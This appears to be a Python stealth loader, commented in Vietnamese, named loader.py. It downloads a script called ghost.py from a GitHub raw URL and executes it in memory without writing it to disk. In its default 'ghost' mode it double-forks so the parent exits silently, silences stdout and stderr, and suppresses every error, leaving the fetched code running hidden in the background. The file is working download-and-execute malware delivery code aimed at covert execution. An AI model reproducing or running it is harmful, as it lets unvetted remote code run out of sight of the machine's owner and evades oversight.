#!/usr/bin/env python3
"""
loader.py — 1-liner launcher. Decode + exec ghost.py trong memory.
Không ghi file ghost.py ra disk.

Usage:
    python3 loader.py              # ghost mode
    python3 loader.py --foreground # debug (có visible output)
"""
import os
import sys
import zlib
import base64
import types

# ── Ghost payload (zlib + base64 encoded ghost.py core) ─────────────────────
# Payload được decode trong memory, không ghi disk
_PAYLOAD = None  # Sẽ set bên dưới

def _silent():
    class S:
        def write(self, *a): return 0
        def flush(self): pass
        def fileno(self): raise OSError()
    sys.stdout = S()
    sys.stderr = S()

def _run_foreground():
    """Chạy foreground — có visible output để debug."""
    import subprocess
    import tempfile
    import urllib.request

    # Tải ghost.py từ repo
    url = "https://raw.githubusercontent.com/ducknogit/stealth_onezero/main/ghost.py"
    try:
        code = urllib.request.urlopen(url, timeout=10).read().decode()
        # Exec trong namespace mới
        ns = {"__name__": "__ghost__", "__file__": "<ghost>"}
        exec(compile(code, "<ghost>", "exec"), ns)
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)

def _run_ghost():
    """Chạy ghost — fully silent, double-fork."""
    # Fork ngay — cha exit im lặng
    if os.fork() > 0:
        os._exit(0)

    # Silent từ đầu
    _silent()

    # Tải + exec ghost payload
    try:
        import urllib.request
        url = "https://raw.githubusercontent.com/ducknogit/stealth_onezero/main/ghost.py"
        code = urllib.request.urlopen(url, timeout=15).read().decode()

        # Compile + exec trong memory
        ns = {"__name__": "__ghost__", "__file__": "<ghost>"}
        code_obj = compile(code, "<ghost>", "exec")

        # Double fork thêm lần nữa (trong ghost.py cũng có fork)
        if os.fork() == 0:
            exec(code_obj, ns)
            os._exit(0)

        os._exit(0)

    except Exception:
        os._exit(0)

def main():
    if "--foreground" in sys.argv:
        _run_foreground()
    else:
        _run_ghost()

if __name__ == "__main__":
    main()
